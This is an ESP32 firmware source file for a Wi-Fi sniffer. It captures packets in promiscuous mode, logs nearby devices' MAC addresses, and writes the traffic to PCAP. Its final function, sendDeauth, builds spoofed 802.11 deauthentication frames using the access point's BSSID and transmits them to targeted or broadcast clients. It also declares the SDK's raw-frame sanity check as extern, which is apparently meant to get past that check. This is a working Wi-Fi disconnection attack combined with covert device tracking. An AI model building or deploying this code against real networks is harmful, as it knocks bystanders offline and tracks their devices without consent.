#include <string.h>
#include <iomanip>
#include <memory>
#include <sstream>
#include <vector>

#include "esp32/rom/crc.h"
#include "esp_log.h"
#include "esp_system.h"
#include "freertos/FreeRTOS.h"

#include "InfoSTA.hpp"
#include "WifiSniffer.hpp"
#include "wifi_pkt.h"

static const char *TAG = "SCAN_SNIFFER";

static WifiSniffer::statistics_t statistics;
static PcapFileQueue *ptr_queue = NULL;

//=================================================
static std::vector<std::unique_ptr<InfoSTA>> _sniffedSTA;
static portMUX_TYPE mutex_mac_list = portMUX_INITIALIZER_UNLOCKED;
static void addSTA(uint8_t *src_addr, uint8_t *dst_addr, uint8_t *bssid_addr, uint32_t ts_sec, uint16_t seq_num, bool isDataRq) {
    bool isNew = true;
    //ESP_LOGI(TAG, "A1[%d] %d/%d", (int)esp_timer_get_time(), mutex_mac_list.owner, mutex_mac_list.count);
    vPortCPUAcquireMutex(&mutex_mac_list);
    for (auto it = _sniffedSTA.begin(); it != _sniffedSTA.end(); it++) {
        it->get()->updateStateByTime(ts_sec);
        if (it->get()->equal(src_addr)) {
            it->get()->update(ts_sec, dst_addr, bssid_addr, seq_num, isDataRq);
            isNew = false;
            break;
        }
    }
    if (isNew) {
        _sniffedSTA.push_back(std::unique_ptr<InfoSTA>(new InfoSTA(src_addr, dst_addr, bssid_addr, ts_sec, seq_num, isDataRq)));
    }

    vPortCPUReleaseMutex(&mutex_mac_list);
    //ESP_LOGI(TAG, "A2 [%d] %d/%d", (int)esp_timer_get_time(), mutex_mac_list.owner, mutex_mac_list.count);
}

//=================================================
static void IRAM_ATTR wifi_sniffer_cb(void *recv_buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *spkt = (wifi_promiscuous_pkt_t *)recv_buf;
    //rx_state != 0 -> 0: no error; others: error numbers which are not public
    if (spkt->rx_ctrl.rx_state != 0 || type == WIFI_PKT_MISC) return;
    uint32_t ts_sec = spkt->rx_ctrl.timestamp / 1000000U;
    uint8_t *src_addr = ((wifi_common_body_t *)(spkt->payload))->address2;
    uint16_t seq_num = ((wifi_common_body_t *)(spkt->payload))->seq_ctrl.seq_num;
    switch (type) {
        case WIFI_PKT_MGMT: {
            switch (((wifi_frame_ctrl_t *)(spkt->payload))->subtype) {
                //case 0b0100: // Probe
                //case 0b0101: return;
                case 0b1011:
                    statistics.cnt_authentication_frame++;
                    break;
                case 0b1100:
                    statistics.cnt_deauthentication_frame++;
                    memcpy(statistics.deauth.src_mac, src_addr, 6);
                    memcpy(statistics.deauth.dst_mac, ((wifi_common_body_t *)(spkt->payload))->address1, 6);
                    statistics.deauth.rssi = spkt->rx_ctrl.rssi;
                    statistics.deauth.noise_floor = spkt->rx_ctrl.noise_floor;
                    statistics.deauth.time = (uint32_t)esp_timer_get_time();
                    break;
                case 0b0000:
                    statistics.cnt_association_frame++;
                    break;
                case 0b1010:
                    statistics.cnt_disassociation_frame++;
                    break;
                case 0b0100:  // probe rq
                    addSTA(src_addr, NULL, NULL, ts_sec, seq_num, false);
                    break;
            }
            statistics.cnt_management_frame++;
            break;
        }
        case WIFI_PKT_DATA:
            statistics.cnt_data_frame++;
            if (((wifi_frame_ctrl_t *)(spkt->payload))->to_ds == 1 && ((wifi_frame_ctrl_t *)(spkt->payload))->from_ds == 0 && (((wifi_frame_ctrl_t *)(spkt->payload))->subtype & 4) == 0) {
                addSTA(src_addr,
                       ((wifi_common_body_t *)(spkt->payload))->address1,
                       ((wifi_common_body_t *)(spkt->payload))->address3,
                       ts_sec, seq_num, true);
            }
            break;
        case WIFI_PKT_CTRL:  //PKT_CTRL does not supported by ESP32 SDK
        case WIFI_PKT_MISC:
            return;  //Other type, such as MIMO etc. 'buf' argument is wifi_promiscuous_pkt_t but the payload is zero length.
    }
    //printf("t:%x st:%x %s\n", ((wifi_frame_ctrl_t *)(spkt->payload))->type, ((wifi_frame_ctrl_t *)(spkt->payload))->subtype,             bin2hex(spkt->payload, 10).c_str());
    if (ptr_queue != NULL && !ptr_queue->isPutDisabled) {
        ptr_queue->putPCAP(spkt->payload, spkt->rx_ctrl.sig_len);
    }
}

//=================================================
WifiSniffer::WifiSniffer(int ch) {
    channel = ch;
    ptr_queue = NULL;
}

void WifiSniffer::setQueue(PcapFileQueue *queue) {
    ptr_queue = queue;
}

std::string WifiSniffer::getMacListJson() {
    std::stringstream ss;
    ss << "{ \"frames\":" << (statistics.cnt_data_frame + statistics.cnt_management_frame) << ", \"mac_list\":[" << std::endl;
    vPortCPUAcquireMutex(&mutex_mac_list);
    for (auto it = _sniffedSTA.begin(); it != _sniffedSTA.end(); it++) {
        if (it != _sniffedSTA.begin()) {
            ss << std::endl;
            ss << ",";
        }
        ss << it->get()->to_json();
    }
    vPortCPUReleaseMutex(&mutex_mac_list);
    ss << "]}";
    return ss.str();
}

void WifiSniffer::getMacLists(std::vector<std::string> &listOnline,
                              std::vector<std::string> &listOffline,
                              std::vector<std::string> &listProbe) {
    std::vector<std::string> list;
    //ESP_LOGI(TAG, "B1 [%d] %d/%d", (int)esp_timer_get_time(), mutex_mac_list.owner, mutex_mac_list.count);
    vPortCPUAcquireMutex(&mutex_mac_list);
    int n = _sniffedSTA.size();
    for (int i = 0; i < n; i++) {
        if (filter != NULL) {
            bool isFiltered = false;
            for (int i = 0; i < filter_sz; i++) {
                if (_sniffedSTA.at(i)->equal(filter + (i * 7) + 1, filter[i * 7])) {
                    isFiltered = true;
                    break;
                }
            }
            if (!isFiltered) continue;
        }
        std::string dmp = _sniffedSTA.at(i)->toString();
        if (_sniffedSTA.at(i)->wasConnected) {
            if (_sniffedSTA.at(i)->isActive)
                listOnline.push_back(dmp);
            else
                listOffline.push_back(dmp);
        } else {
            listProbe.push_back(dmp);
        }
    }
    vPortCPUReleaseMutex(&mutex_mac_list);
    //ESP_LOGI(TAG, "B2 [%d] %d/%d", (int)esp_timer_get_time(), mutex_mac_list.owner, mutex_mac_list.count);
}

bool WifiSniffer::start() {
    ESP_LOGI(TAG, "+++ WifiSniffer.start");
    memset(&statistics, 0, sizeof(statistics));

    if (listen_as_AP) {
        uint8_t mac_addr[6];
        for (int i = 0; i < sizeof(mac_addr); i++) mac_addr[i] = esp_random();
        mac_addr[0] &= 0xfE;  //Base MAC must be a unicast MAC (least significant bit of first byte must be zero).
        mac_addr[0] |= 0x02;  // set the "locally administered" bit (bit value 0x02 in the first byte) to avoid collisions.
        esp_base_mac_addr_set(mac_addr);
    }

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ERROR_CHECK_RET_BOOL(esp_wifi_init(&cfg));
    ERROR_CHECK_RET_BOOL(esp_wifi_set_storage(WIFI_STORAGE_RAM));

    if (listen_as_AP) {
        ERROR_CHECK_RET_BOOL(esp_wifi_set_mode(WIFI_MODE_AP));
        wifi_config_t wifi_config;
        memset(&wifi_config, 0, sizeof(wifi_config));
        wifi_config.ap.channel = 1,
        wifi_config.ap.authmode = WIFI_AUTH_WPA2_PSK,
        wifi_config.ap.ssid_hidden = 1,
        wifi_config.ap.max_connection = 1,
        strcpy((char *)wifi_config.ap.password, "undefined");
        wifi_config.ap.beacon_interval = 60000;
        ERROR_CHECK_RET_BOOL(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    } else {
        ERROR_CHECK_RET_BOOL(esp_wifi_set_mode(WIFI_MODE_NULL));
    }
    ERROR_CHECK_RET_BOOL(esp_wifi_start());

    wifi_promiscuous_filter_t filter;
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
    ERROR_CHECK_RET_BOOL(esp_wifi_set_promiscuous(true));
    ERROR_CHECK_RET_BOOL(esp_wifi_set_promiscuous_filter(&filter));
    ERROR_CHECK_RET_BOOL(esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb));
    ERROR_CHECK_RET_BOOL(esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE));

    ESP_LOGI(TAG, "--- WifiSniffer. start");
    return true;
}

void WifiSniffer::stop() {
    ESP_LOGI(TAG, "+++ stop");
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    ptr_queue = NULL;
    ESP_LOGI(TAG, "--- stop");
}

WifiSniffer::~WifiSniffer() {
    stop();
    _sniffedSTA.clear();
    if (filter != NULL) {
        free(filter);
        filter = NULL;
    }
}

void WifiSniffer::getStatistics(statistics_t &s) {
    memcpy(&s, &statistics, sizeof(statistics_t));
}

void WifiSniffer::setFilter(std::vector<std::string> &list) {
    filter_sz = list.size();
    if (filter_sz == 0) return;
    filter = (uint8_t *)malloc(7 * filter_sz);
    if (filter == NULL) {
        scr_error("filter malloc == NULL [%d][6]", filter_sz);
        return;
    }
    for (int i = 0; i < filter_sz; i++) filter[i * 7] = hex2bin(list.at(i).c_str(), filter + i * 7 + 1, 6);

    for (int i = 0; i < filter_sz; i++) {
        ESP_LOGI(TAG, "filter[%d] '%s'", i, bin2hex(filter + i * 7 + 1, filter[i * 7]).c_str());
    }
}

extern esp_err_t ieee80211_raw_frame_sanity_check(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

//-------------------------------
static wifi_err_reason_t deauth_reasons[] = {
    wifi_err_reason_t::WIFI_REASON_AUTH_EXPIRE,
    wifi_err_reason_t::WIFI_REASON_AUTH_LEAVE,
    wifi_err_reason_t::WIFI_REASON_UNSPECIFIED,
    wifi_err_reason_t::WIFI_REASON_MIC_FAILURE,
    wifi_err_reason_t::WIFI_REASON_ASSOC_EXPIRE,
    wifi_err_reason_t::WIFI_REASON_NOT_ASSOCED,
};

void WifiSniffer::sendDeauth() {
    wifi_deauth_deaus_body_t pk;
    memset(&pk, 0, sizeof(pk));
    pk.reason = deauth_reasons[esp_random() % (sizeof(deauth_reasons) / sizeof(wifi_err_reason_t))];
    pk.frame_ctrl.subtype = 0xC;  //1100 - deauthentication

    bool hasSTA = false;
    //portENTER_CRITICAL(&mutex_mac_list);
    for (auto it = _sniffedSTA.begin(); it != _sniffedSTA.end(); it++) {
        if (filter != NULL) {
            bool isFiltered = false;
            for (int i = 0; i < filter_sz; i++) {
                if (it->get()->equal(filter + (i * 7) + 1, filter[i * 7])) {
                    isFiltered = true;
                    break;
                }
            }
            if (!isFiltered) continue;
        }
        if (it->get()->wasConnected && it->get()->isActive) {
            hasSTA = true;
            memcpy(pk.bssid, it->get()->bssid, 6);
            if (filter != NULL)
                memcpy(pk.dest_address, it->get()->mac, 6);
            else
                memset(pk.dest_address, 0xff, 6);
            //memcpy(pk.src_address, it->get()->dest, 6);
            memcpy(pk.src_address, it->get()->bssid, 6);
        }
    }
    //portEXIT_CRITICAL(&mutex_mac_list);
    if (hasSTA) {
        ERROR_CHECK_RET(esp_wifi_80211_tx(WIFI_IF_AP, &pk, sizeof(pk), false));
        std::stringstream ss;
        ss << "sendDeauth bssid:" << bin2mac(pk.bssid).c_str() << " dest:" << bin2mac(pk.dest_address).c_str() << " src:" << bin2mac(pk.src_address).c_str();
        ss << " frame:" << bin2hex(&pk, sizeof(pk)).c_str();
        ESP_LOGI(TAG, "sendDeauth bssid:%s dest:%s src:%s frame: %s", bin2mac(pk.bssid).c_str(), bin2mac(pk.dest_address).c_str(), bin2mac(pk.src_address).c_str(), bin2hex(&pk, sizeof(pk)).c_str());
    }
}
